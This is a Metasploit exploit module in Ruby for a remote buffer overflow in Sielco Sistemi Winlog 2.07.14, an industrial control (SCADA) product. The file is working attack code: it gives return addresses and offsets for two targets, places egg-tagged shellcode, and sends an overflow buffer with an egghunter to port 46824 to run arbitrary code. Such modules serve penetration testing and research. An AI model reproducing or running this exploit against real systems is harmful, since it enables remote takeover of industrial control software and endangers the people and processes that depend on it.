##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::Tcp
	include Msf::Exploit::Remote::Egghunter

	def initialize(info = {})
		super(update_info(info,
			'Name'         => 'Sielco Sistemi Winlog Buffer Overflow 2.07.14',
			'Description'  => %q{
				This module exploits a buffer overflow in Sielco Sistem Winlog <= 2.07.14.
				When sending a specially formatted packet to the Runtime.exe service on port 46824,
				an attacker may be able to execute arbitrary code.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'm-1-k-3 <m1k3[at]s3cur1ty.de>'
				],
			'References'     =>
				[
					[ 'BID', '53811'],
					[ 'URL', 'http://www.s3cur1ty.de' ],
					[ 'URL', 'http://www.sielcosistemi.com/en/download/public/winlog_lite.html' ]
				],
			'DefaultOptions' =>
				{
					'ExitFunction' => 'process',
				},
			'Platform'       => 'win',
			'Payload'        =>
				{
					'Space'    => 2000,
					'BadChars' => "\x00",
					'DisableNops' => true,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Sielco Sistemi Winlog 2.07.14 - Ceramics Kiln Project',
						{
							'Ret'    => 0x405153df,
							'Offset' => 167,
						}
					], #  Jmp ESP - Vclx40.bpl - 0x405153df
					[ 'Sielco Sistemi Winlog 2.07.14 - Automatic Washing System Project',
						{
							'Ret'    => 0x405153df,
							'Offset' => 151,
						}
					], #  Jmp ESP - Vclx40.bpl - 0x405153df
					#The reliability depends on the actual project. We need to generate some more
					#targets. Two of them for the default project and one other project is now available.
				],
			'Privileged'     => false,
			'DisclosureDate' => 'Jun 04 2012',
			'DefaultTarget'  => 0))

		register_options([Opt::RPORT(46824)], self.class)
	end

	def exploit
		connect

		egghunter,egg = generate_egghunter(payload.encoded, payload_badchars)

		print_status("Placing the shellcode")
		shellcode = rand_text_alpha(2000)
		shellcode << egg
		sock.put(shellcode)

		select(nil,nil,nil,1)

		buffer = rand_text_alpha(20)
		buffer << "\x14" * 10 	#trigger the crash
		buffer << rand_text_alpha(target['Offset'])
		buffer << [target.ret].pack('V')
		buffer << egghunter
		buffer << rand_text_alpha(69 - egghunter.length)

		print_status("Trying target #{target.name}...")
		sock.put(buffer)

		handler
		disconnect

	end
end
